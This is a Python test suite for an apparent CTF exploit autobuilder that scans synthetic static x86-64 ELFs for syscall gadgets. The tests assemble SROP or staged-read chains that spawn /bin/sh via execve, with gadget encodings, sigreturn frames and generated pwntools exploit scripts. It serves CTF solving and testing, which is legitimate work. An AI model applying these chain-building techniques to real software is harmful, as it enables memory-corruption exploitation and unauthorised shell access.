"""Deterministic, offline tests for the static-nostdlib SROP/execve autobuilder (B-052).

Every ELF fixture is synthesised in-process (no real challenge binary is committed or executed), and
the plan is exercised both on hand-built byte sequences and end to end through ``solve``.  Nothing
here maps, assembles against, or runs a binary, and there is no network surface.
"""
from __future__ import annotations

import struct
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))
sys.path.insert(0, str(REPO / "solvers" / "toolkits"))

import srop_autobuild as S  # noqa: E402
import userland_chains as _chains  # noqa: E402
from ctf import event  # noqa: E402


# --------------------------------------------------------------------------- synthetic ELF builders

CODE_VADDR_BASE = 0x400000
BSS_VADDR = 0x404000

# Verified x86-64 encodings (capstone-confirmed in test_capstone_confirms_gadget_encodings).
MOV_RAX_RBP_18 = bytes.fromhex("488b45e8")   # mov rax, [rbp-0x18]
MOV_RAX_RBP_20 = bytes.fromhex("488b45e0")   # mov rax, [rbp-0x20]
MOV_RDI_RBP_10 = bytes.fromhex("488b7df0")   # mov rdi, [rbp-0x10]
MOV_RSI_RBP_08 = bytes.fromhex("488b75f8")   # mov rsi, [rbp-0x08]
MOV_RDX_RBP_20 = bytes.fromhex("488b55e0")   # mov rdx, [rbp-0x20]
MOV_RAX_RBP_18_D32 = bytes.fromhex("488b85e8ffffff")  # mov rax, [rbp-0x18] (disp32 form)
MOV_RAX_RSP = bytes.fromhex("488b4424f8")    # mov rax, [rsp-0x08] (NOT rbp-relative)
MOV_RAX_R13_18 = bytes.fromhex("498b45e8")   # mov rax, [r13-0x18] (REX.B set -> base r13, NOT rbp)
MOV_R8_R13_18 = bytes.fromhex("4f8b45e8")    # mov r8, [r13-0x18] (REX.WRXB=0x4F -> base r13, NOT rbp)
SYSCALL = bytes.fromhex("0f05")
SYSCALL_RET = bytes.fromhex("0f05c3")
POP_RAX_RET = bytes.fromhex("58c3")
LEAVE_RET = bytes.fromhex("c9c3")
POP_RBP_RET = bytes.fromhex("5dc3")

INLINE_GADGET = MOV_RAX_RBP_18 + MOV_RDI_RBP_10 + MOV_RSI_RBP_08 + MOV_RDX_RBP_20 + SYSCALL


def _static_elf(code, *, etype=2, machine=62, interp=False, writable=((BSS_VADDR, 0x10, 0x400),),
                dynamic=False):
    """A minimal ELF64: one R+X PT_LOAD over the header+code, plus a R+W PT_LOAD per `writable`
    (vaddr, filesz, memsz).  `interp` adds a PT_INTERP (dynamic); `dynamic` adds a bare PT_DYNAMIC."""
    ec = "<"
    kinds = ["code"] + ["w"] * len(writable)
    if interp:
        kinds.append("interp")
    if dynamic:
        kinds.append("dynamic")
    phnum = len(kinds)
    code_off = 64 + phnum * 56
    code_vaddr = CODE_VADDR_BASE + code_off
    blob = bytearray()
    wi = 0
    for kind in kinds:
        if kind == "code":
            filesz = code_off + len(code)
            blob += struct.pack(ec + "IIQQQQQQ", 1, 5, 0, CODE_VADDR_BASE, CODE_VADDR_BASE,
                                filesz, filesz, 0x1000)
        elif kind == "w":
            vaddr, filesz, memsz = writable[wi]
            wi += 1
            blob += struct.pack(ec + "IIQQQQQQ", 1, 6, code_off, vaddr, vaddr, filesz, memsz, 0x1000)
        elif kind == "interp":
            blob += struct.pack(ec + "IIQQQQQQ", 3, 4, code_off, code_vaddr, code_vaddr, 1, 1, 1)
        else:  # dynamic
            blob += struct.pack(ec + "IIQQQQQQ", 2, 6, code_off, 0x403000, 0x403000, 0x10, 0x10, 8)
    ident = b"\x7fELF" + bytes((2, 1, 1, 0)) + b"\x00" * 8
    ehdr = ident + struct.pack(ec + "HHIQQQIHHHHHH", etype, machine, 1, code_vaddr, 64, 0, 0,
                               64, 56, phnum, 64, 0, 0)
    return bytes(ehdr + blob + code), code_vaddr


def _static_elf_with_symbols(code, symbols, *, etype=2):
    """ELF64 with a R+X PT_LOAD, a R+W PT_LOAD (.bss) and a .symtab/.strtab for pyelftools.

    `symbols`: (name, value, shndx, stype, sbind); shndx 1 == defined, 0 == SHN_UNDEF (import).
    """
    ec = "<"
    phnum = 2  # code + bss
    code_off = 64 + phnum * 56
    code_vaddr = CODE_VADDR_BASE + code_off
    strtab = bytearray(b"\x00")
    name_off = {}
    for name, *_ in symbols:
        name_off[name] = len(strtab)
        strtab += name.encode() + b"\x00"
    shstr = bytearray(b"\x00")
    sh_name_off = {}
    for sname in (".text", ".symtab", ".strtab", ".shstrtab"):
        sh_name_off[sname] = len(shstr)
        shstr += sname.encode() + b"\x00"
    syments = bytearray(struct.pack(ec + "IBBHQQ", 0, 0, 0, 0, 0, 0))
    for name, value, shndx, stype, sbind in symbols:
        st_info = (sbind << 4) | stype
        syments += struct.pack(ec + "IBBHQQ", name_off[name], st_info, 0, shndx, value, 0)
    strtab_off = code_off + len(code)
    shstr_off = strtab_off + len(strtab)
    symtab_off = (shstr_off + len(shstr) + 7) & ~7
    shoff = symtab_off + len(syments)
    phblob = bytearray()
    filesz = code_off + len(code)
    phblob += struct.pack(ec + "IIQQQQQQ", 1, 5, 0, CODE_VADDR_BASE, CODE_VADDR_BASE, filesz, filesz, 0x1000)
    phblob += struct.pack(ec + "IIQQQQQQ", 1, 6, code_off, BSS_VADDR, BSS_VADDR, 0x10, 0x400, 0x1000)

    def shdr(name, stype, flags, addr, off, size, link=0, info=0, align=1, ent=0):
        return struct.pack(ec + "IIQQQQIIQQ", name, stype, flags, addr, off, size, link, info, align, ent)

    shdrs = b"".join([
        shdr(0, 0, 0, 0, 0, 0),
        shdr(sh_name_off[".text"], 1, 6, code_vaddr, code_off, len(code), align=1),
        shdr(sh_name_off[".symtab"], 2, 0, 0, symtab_off, len(syments), link=3, info=1, align=8, ent=24),
        shdr(sh_name_off[".strtab"], 3, 0, 0, strtab_off, len(strtab)),
        shdr(sh_name_off[".shstrtab"], 3, 0, 0, shstr_off, len(shstr)),
    ])
    ident = b"\x7fELF" + bytes((2, 1, 1, 0)) + b"\x00" * 8
    ehdr = ident + struct.pack(ec + "HHIQQQIHHHHHH", etype, 62, 1, code_vaddr, 64, shoff, 0,
                               64, 56, phnum, 64, 5, 4)
    out = bytearray(ehdr + phblob)
    assert len(out) == code_off
    out += code
    out += strtab
    out += shstr
    out += b"\x00" * (symtab_off - (shstr_off + len(shstr)))
    out += syments
    assert len(out) == shoff
    out += shdrs
    return bytes(out), code_vaddr


FULL_CODE = b"\x90" + INLINE_GADGET + POP_RAX_RET + SYSCALL_RET + LEAVE_RET + POP_RBP_RET


def _csctf():
    return event.load("csctf")


# --------------------------------------------------------------------------- static profile detection

def test_profile_recognises_static_no_pie_nostdlib_and_finds_bss():
    elf, _ = _static_elf(FULL_CODE)
    prof = S.profile_static_elf(elf)
    assert prof.arch == "amd64" and prof.bits == 64
    assert prof.static is True
    assert prof.no_pie is True
    assert prof.nostdlib is True
    assert prof.applicable is True
    bss = prof.bss_region()
    assert bss is not None and bss.vaddr == BSS_VADDR and bss.bss_gap == 0x400 - 0x10


def test_profile_declines_a_dynamically_linked_binary():
    elf, _ = _static_elf(FULL_CODE, interp=True)
    prof = S.profile_static_elf(elf)
    assert prof.static is False
    assert prof.applicable is False
    assert any("PT_INTERP" in n or "dynamically linked" in n for n in prof.notes)


def test_profile_declines_a_static_pie_because_addresses_need_a_leak():
    # ET_DYN with no PT_INTERP is a static-PIE: static True, but no_pie False, so not applicable.
    elf, _ = _static_elf(FULL_CODE, etype=3)
    prof = S.profile_static_elf(elf)
    assert prof.static is True
    assert prof.no_pie is False
    assert prof.applicable is False
    assert any("static-PIE" in n or "leak" in n for n in prof.notes)


@pytest.mark.needs_tool("py:elftools")
def test_profile_nostdlib_is_false_when_libc_markers_are_linked():
    # A static binary that nonetheless links libc (__libc_start_main defined) is NOT nostdlib.
    symbols = [("__libc_start_main", 0x401100, 1, 2, 1), ("main", 0x401140, 1, 2, 1)]
    elf, _ = _static_elf_with_symbols(FULL_CODE, symbols)
    prof = S.profile_static_elf(elf)
    assert prof.has_symbols is True
    assert prof.static is True and prof.no_pie is True
    assert prof.nostdlib is False


@pytest.mark.needs_tool("py:elftools")
def test_profile_collects_the_read_overflow_surface_from_imports():
    symbols = [("read", 0, 0, 2, 1), ("main", 0x401140, 1, 2, 1)]
    elf, _ = _static_elf_with_symbols(FULL_CODE, symbols)
    prof = S.profile_static_elf(elf)
    assert "read" in prof.overflow_surface


def test_bss_region_prefers_the_segment_with_the_largest_zero_gap():
    # First writable segment is fully file-backed (no gap); second has a 0x300 bss gap.
    elf, _ = _static_elf(FULL_CODE, writable=((0x404000, 0x100, 0x100), (0x405000, 0x40, 0x340)))
    prof = S.profile_static_elf(elf)
    bss = prof.bss_region()
    assert bss is not None and bss.vaddr == 0x405000 and bss.bss_gap == 0x300


# --------------------------------------------------------------------------- inline-syscall scanner

def test_find_inline_memory_syscall_gadget_records_each_rbp_load():
    elf, _ = _static_elf(FULL_CODE)
    gadgets = S.find_syscall_gadgets(elf)
    inline = [g for g in gadgets if g.kind == "syscall-from-memory"]
    assert len(inline) == 1
    g = inline[0]
    assert g.load_map == {"rax": -0x18, "rdi": -0x10, "rsi": -0x08, "rdx": -0x20}
    assert g.rax_displacement == -0x18
    assert g.sets_rax_from_memory is True
    # The gadget address is the first load, not the syscall.
    assert g.address < g.syscall_address


def test_find_syscall_distinguishes_a_bare_syscall_from_an_inline_one():
    # A syscall with no preceding rbp load is a bare `syscall`, usable for SROP, not an inline gadget.
    elf, _ = _static_elf(b"\x90\x90" + SYSCALL + b"\xc3")
    gadgets = S.find_syscall_gadgets(elf)
    assert len(gadgets) == 1
    assert gadgets[0].kind == "syscall"
    assert gadgets[0].sets_rax_from_memory is False
    assert gadgets[0].has_ret is True


def test_scanner_rejects_a_non_rbp_relative_load_before_the_syscall():
    # `mov rax,[rsp-8]` must NOT be collected as an rbp operand load: the pivot controls rbp, not rsp.
    elf, _ = _static_elf(b"\x90" + MOV_RAX_RSP + SYSCALL)
    gadgets = S.find_syscall_gadgets(elf)
    assert len(gadgets) == 1
    assert gadgets[0].loads == ()
    assert gadgets[0].kind == "syscall"


def test_scanner_rejects_a_rex_b_load_whose_base_is_r13_not_rbp():
    # `49 8b 45 e8` is `mov rax,[r13-0x18]`: identical ModRM to the rbp form, but REX.B makes the base
    # r13, a register the frame-pointer pivot does NOT control.  The decoder's REX.B guard must reject
    # it; without the guard it is misread as `mov rax,[rbp-0x18]` and wrongly staged as an rax operand.
    elf, _ = _static_elf(b"\x90" + MOV_RAX_R13_18 + SYSCALL)
    gadgets = S.find_syscall_gadgets(elf)
    assert len(gadgets) == 1
    assert gadgets[0].loads == ()
    assert gadgets[0].kind == "syscall"
    assert gadgets[0].sets_rax_from_memory is False


def test_scanner_rejects_a_no_rex_load_after_a_rex_wrxb_prefix_0x4f_boundary():
    # `4f 8b 45 e8` is `mov r8,[r13-0x18]`: REX.WRXB (0x4F) is the top of the REX range, and REX.B
    # again makes the base r13.  The REX decode rejects it for REX.B; the no-REX decode must then NOT
    # re-read the trailing `8b 45 e8` as `mov eax,[rbp-0x18]`, because the 0x4F before it is a REX
    # prefix, not the tail of some other instruction.  This anchors the 0x4F *upper* end of the
    # no-REX-after-REX guard: the r13 fixture above only reaches 0x49, so without this a guard that
    # stopped at 0x4E would still misread this 0x4F case and stage a bogus eax operand.
    elf, _ = _static_elf(b"\x90" + MOV_R8_R13_18 + SYSCALL)
    gadgets = S.find_syscall_gadgets(elf)
    assert len(gadgets) == 1
    assert gadgets[0].loads == ()
    assert gadgets[0].kind == "syscall"
    assert gadgets[0].sets_rax_from_memory is False


def test_scanner_keeps_duplicate_rax_loads_in_program_order_last_wins():
    # Two rax loads before the syscall: rax=[rbp-0x18] then rax=[rbp-0x20] (the one nearest the
    # syscall, last in program order).  The scanner walks backwards, so the collected list must be
    # reversed into program order; load_map's last-wins rule then has to resolve rax to -0x20, the
    # displacement that actually reaches the syscall.  Without the reverse(), the order flips silently
    # and rax resolves to -0x18, staging the execve number from the wrong slot.
    elf, _ = _static_elf(b"\x90" + MOV_RAX_RBP_18 + MOV_RAX_RBP_20 + SYSCALL)
    gadgets = S.find_syscall_gadgets(elf)
    assert len(gadgets) == 1
    g = gadgets[0]
    assert g.loads == (("rax", -0x18), ("rax", -0x20))   # program order, earliest first
    assert g.rax_displacement == -0x20                   # program-order-last wins


def test_scanner_decodes_the_disp32_load_form():
    elf, _ = _static_elf(b"\x90" + MOV_RAX_RBP_18_D32 + SYSCALL)
    g = S.find_syscall_gadgets(elf)[0]
    assert g.rax_displacement == -0x18
    assert g.kind == "syscall-from-memory"


def test_scanner_is_amd64_only_and_declines_other_arches_by_name():
    # An aarch64 ELF has no x86 syscall idiom here; the scanner returns nothing (declines by name).
    elf, _ = _static_elf(FULL_CODE, machine=183)
    assert S.find_syscall_gadgets(elf) == ()


def test_scanner_window_bounds_how_far_back_it_walks():
    with pytest.raises(S.SropBuildError, match="window"):
        S.find_syscall_gadgets(_static_elf(FULL_CODE)[0], window=1)


@pytest.mark.needs_tool("py:capstone")
def test_capstone_confirms_the_fixture_gadget_encodings_are_real_x86_64():
    # Anchor the hand-written fixture bytes to reality: the inline gadget really disassembles to the
    # mov-from-[rbp]/syscall sequence the scanner claims to recognise (no tautology against itself).
    import capstone
    md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    seq = [f"{i.mnemonic} {i.op_str}" for i in md.disasm(INLINE_GADGET, 0x1000)]
    assert seq == [
        "mov rax, qword ptr [rbp - 0x18]",
        "mov rdi, qword ptr [rbp - 0x10]",
        "mov rsi, qword ptr [rbp - 8]",
        "mov rdx, qword ptr [rbp - 0x20]",
        "syscall ",
    ]
    # Anchor the two guard/order fixtures too: the REX.B byte really is an r13 base (not rbp), and the
    # second duplicate-rax fixture byte really is the rbp-0x20 load, so the guard/order tests are not
    # tautologies against the decoder they exercise.
    def one(b):
        return next(f"{i.mnemonic} {i.op_str}" for i in md.disasm(b, 0x1000))
    assert one(MOV_RAX_R13_18) == "mov rax, qword ptr [r13 - 0x18]"
    assert one(MOV_R8_R13_18) == "mov r8, qword ptr [r13 - 0x18]"   # REX.WRXB 0x4F boundary fixture
    assert one(MOV_RAX_RBP_20) == "mov rax, qword ptr [rbp - 0x20]"


# --------------------------------------------------------------------------- SROP chain assembly

def test_srop_plan_is_concrete_and_byte_identical_to_the_userland_chains_serializer():
    elf, _ = _static_elf(FULL_CODE)
    plan = S.build_plan(elf, overflow_offset=0x48)
    assert plan.strategy == "srop"
    assert plan.confidence == "concrete"
    assert plan.payload is not None
    # Recompute the expected payload from the addresses the plan derived and compare byte for byte.
    chain = plan.chain
    expected = _chains.build_srop_execve(
        syscall_gadget=chain["syscall_gadget"], pop_accumulator=chain["accumulator_gadget"],
        command_address=chain["command_address"], stack_address=chain["stack_address"],
        overflow_offset=0x48, architecture="amd64",
    )
    assert plan.payload == expected.payload
    # execve setup lives in the frame: rax=59, rsi=rdx=0.
    assert chain["frame"]["rax"] == 59


def test_srop_needs_offset_when_the_buffer_offset_is_unknown():
    elf, _ = _static_elf(FULL_CODE)
    plan = S.build_plan(elf)  # no overflow_offset
    assert plan.strategy == "srop"
    assert plan.confidence == "needs-offset"
    assert plan.payload is None
    assert any("buffer offset" in n for n in plan.notes)


def test_srop_needs_stage_addr_when_no_writable_region_exists():
    # No writable PT_LOAD -> nowhere to stage /bin/sh, so the SROP command address is unresolved.
    elf, _ = _static_elf(b"\x90" + SYSCALL_RET + POP_RAX_RET, writable=())
    plan = S.build_plan(elf, overflow_offset=0x48)
    assert plan.strategy == "srop"
    assert plan.confidence == "needs-stage-addr"
    assert plan.payload is None


def test_srop_command_address_is_inside_the_bss_region():
    elf, _ = _static_elf(FULL_CODE)
    plan = S.build_plan(elf, overflow_offset=0x48)
    cmd = plan.chain["command_address"]
    assert BSS_VADDR <= cmd < BSS_VADDR + 0x400


@pytest.mark.needs_tool("py:pwnlib")
def test_srop_frame_bytes_match_a_pwntools_sigreturn_frame():
    # Cross-validate the embedded sigcontext against pwntools' own SigreturnFrame.
    from pwnlib.context import context
    from pwnlib.rop.srop import SigreturnFrame
    elf, _ = _static_elf(FULL_CODE)
    plan = S.build_plan(elf, overflow_offset=0x48)
    chain = plan.chain
    with context.local(arch="amd64", bits=64, os="linux", kernel="amd64"):
        frame = SigreturnFrame()
        frame.rax = 59
        frame.rdi = chain["command_address"]
        frame.rsi = 0
        frame.rdx = 0
        frame.rip = chain["syscall_gadget"]
        frame.rsp = chain["stack_address"]
        expected_frame = bytes(frame)
    assert plan.payload.endswith(expected_frame)


# --------------------------------------------------------------------------- staged-read chain

def test_staged_read_plan_lays_execve_operands_at_the_gadget_rbp_offsets():
    # No SROP surface (no pop rax / syscall;ret): the inline gadget + leave;ret pivot path is chosen.
    code = b"\x90" + INLINE_GADGET + LEAVE_RET
    elf, _ = _static_elf(code)
    plan = S.build_plan(elf)
    assert plan.strategy == "staged-read-syscall"
    rp = plan.read_pivot
    assert rp["primitive"] == "leave;ret"
    pivot = plan.chain["pivot_target"]
    layout = {slot["register"]: slot for slot in plan.chain["register_layout"]}
    assert layout["rax"]["value"] == 59
    assert layout["rax"]["stage_addr"] == pivot - 0x18
    assert layout["rdi"]["stage_addr"] == pivot - 0x10
    assert "command_address" in str(layout["rdi"]["value"])
    assert layout["rsi"]["value"] == 0 and layout["rdx"]["value"] == 0


def test_staged_read_needs_gadget_without_a_pivot_primitive():
    # Inline gadget present but no leave;ret / pop rbp;ret -> the pivot half is missing.
    code = b"\x90" + INLINE_GADGET
    elf, _ = _static_elf(code)
    plan = S.build_plan(elf, strategy="staged-read-syscall")
    assert plan.strategy == "staged-read-syscall"
    assert plan.confidence in ("needs-gadget", "needs-stage-addr")
    assert any("pivot" in n for n in plan.notes)


def test_forcing_staged_strategy_overrides_the_srop_preference():
    elf, _ = _static_elf(FULL_CODE)  # both surfaces present; default prefers SROP
    default = S.build_plan(elf, overflow_offset=0x48)
    forced = S.build_plan(elf, strategy="staged-read-syscall")
    assert default.strategy == "srop"
    assert forced.strategy == "staged-read-syscall"


# --------------------------------------------------------------------------- strategy selection

def test_build_plan_prefers_srop_but_lists_the_staged_alternative():
    elf, _ = _static_elf(FULL_CODE)
    plan = S.build_plan(elf, overflow_offset=0x48)
    assert plan.strategy == "srop"
    assert "staged-read-syscall" in plan.alternatives


def test_build_plan_is_none_without_any_syscall_surface():
    elf, _ = _static_elf(b"\x90" + POP_RAX_RET + LEAVE_RET)  # no syscall at all
    plan = S.build_plan(elf)
    assert plan.strategy == "none"
    assert plan.confidence == "none"


def test_build_plan_declines_a_dynamic_binary_by_name():
    elf, _ = _static_elf(FULL_CODE, interp=True)
    plan = S.build_plan(elf)
    assert plan.strategy == "none"
    assert any("static" in n and "declin" in n.lower() for n in plan.notes)


def test_build_plan_rejects_a_bad_strategy_and_empty_command():
    elf, _ = _static_elf(FULL_CODE)
    with pytest.raises(S.SropBuildError):
        S.build_plan(elf, strategy="ret2libc")
    with pytest.raises(S.SropBuildError):
        S.build_plan(elf, command=b"")


# --------------------------------------------------------------------------- rendering

def test_renderers_are_text_only_and_name_the_plan_boundary():
    elf, _ = _static_elf(FULL_CODE)
    plan = S.build_plan(elf, overflow_offset=0x48)
    md = S.plan_markdown(plan)
    py = S.render_pwntools(plan)
    assert "SROP" in md or "srop" in md
    assert "syscall-from-memory" in md
    assert "Nothing here is executed" in py
    assert "SigreturnFrame" in py  # the SROP script scaffolds the frame


# --------------------------------------------------------------------------- engine entry (solve)

@pytest.mark.needs_tool("py:elftools")
def test_solve_writes_a_plan_and_reports_unsure(tmp_path):
    chal = tmp_path / "chal"
    chal.mkdir()
    elf, _ = _static_elf(FULL_CODE)
    (chal / "sigil").write_bytes(elf)
    r = S.solve(chal, _csctf())
    assert r.status == "unsure"
    assert "srop" in r.notes
    md = chal / "recon" / "srop_autobuild" / "sigil.plan.md"
    py = chal / "recon" / "srop_autobuild" / "sigil.exploit.py"
    js = chal / "recon" / "srop_autobuild" / "sigil.plan.json"
    assert md.is_file() and py.is_file() and js.is_file()
    assert any(e.kind == "plan" for e in r.evidence)


def test_solve_blocked_without_an_elf(tmp_path):
    chal = tmp_path / "chal"
    chal.mkdir()
    (chal / "readme.txt").write_text("no binary here")
    r = S.solve(chal, _csctf())
    assert r.status == "blocked"
    assert "no ELF" in r.notes


def test_solve_candidate_when_a_flag_literal_is_in_the_binary(tmp_path):
    chal = tmp_path / "chal"
    chal.mkdir()
    elf, _ = _static_elf(b"\x90" + b"csctf{static_srop_literal}\x00" + INLINE_GADGET + LEAVE_RET)
    (chal / "leaky").write_bytes(elf)
    r = S.solve(chal, _csctf())
    assert r.status == "candidate"
    assert "csctf{static_srop_literal}" in r.flags


def test_solve_reports_none_for_a_dynamic_binary(tmp_path):
    chal = tmp_path / "chal"
    chal.mkdir()
    elf, _ = _static_elf(FULL_CODE, interp=True)
    (chal / "dyn").write_bytes(elf)
    r = S.solve(chal, _csctf())
    assert r.status == "none"


def test_solve_carries_a_decompile_hint_from_b011_output(tmp_path):
    chal = tmp_path / "chal"
    chal.mkdir()
    elf, _ = _static_elf(FULL_CODE)
    (chal / "sigil").write_bytes(elf)
    # B-011 decompile output: recon/decompile/<file>/<fn>.c with a read() overflow.
    dec = chal / "recon" / "decompile" / "sigil"
    dec.mkdir(parents=True)
    (dec / "main.c").write_text("void main(){ char buf[0x40]; read(0, buf, 0x400); }\n")
    S.solve(chal, _csctf())
    plan_md = (chal / "recon" / "srop_autobuild" / "sigil.plan.md").read_text()
    assert "decompile (B-011)" in plan_md
    assert "read()" in plan_md


# --------------------------------------------------------------------------- input validation

def test_non_elf_and_truncated_inputs_raise_a_named_error():
    with pytest.raises(S.SropBuildError, match="not an ELF"):
        S.profile_static_elf(b"not an elf at all")
    with pytest.raises(S.SropBuildError, match="truncated"):
        # >= 20 bytes (passes the magic gate) but < 64, so the ELF64 header is truncated.
        S.profile_static_elf(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 48)


# --------------------------------------------------------------------------- manifest + routing

def test_manifest_parses_and_matches_the_module():
    from ctf.engines import manifest
    path = REPO / "solvers" / "toolkits" / "srop_autobuild.manifest.toml"
    m = manifest.load(path)
    assert m.id == "toolkits.srop_autobuild"
    assert m.entry_raw == "solvers.toolkits.srop_autobuild:solve"
    assert m.has("plan")
    assert m.routes


def test_route_reaches_the_autobuilder_for_a_static_nostdlib_pwn_challenge():
    from ctf.engines import manifest, router
    manifest.discover(REPO)
    hits = router.route("pwn", "a static no-pie nostdlib binary needs a syscall gadget execve chain", None)
    assert any(h.manifest.id == "toolkits.srop_autobuild" for h in hits)


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-q"]))
